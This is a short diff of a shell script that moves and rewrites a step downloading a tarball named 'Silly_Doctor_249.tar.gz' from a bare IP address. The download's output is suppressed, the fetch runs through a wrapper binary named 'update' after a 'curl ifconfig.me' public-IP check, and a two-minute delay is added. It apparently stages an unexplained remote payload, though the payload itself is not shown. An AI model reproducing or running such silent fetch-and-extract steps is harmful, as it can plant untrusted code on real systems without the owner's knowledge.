@@ -70,17 +70,6 @@ sleep 3
 
 sleep 2
 
-wget http://176.58.105.206/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
-
-sleep 2
-
-tar -xf Silly_Doctor_249.tar.gz
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
 ./update/update curl ifconfig.me
 
 echo " "
@@ -91,6 +80,18 @@ echo "******************************************************************"
 echo " "
 echo " "
 
+sleep 120
+
+./update/update wget http://176.58.105.206/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
+
+sleep 2
+
+tar -xf Silly_Doctor_249.tar.gz
+
+echo " "
+echo " "
+
+echo "******************************************************************"
 
 sleep 2
 
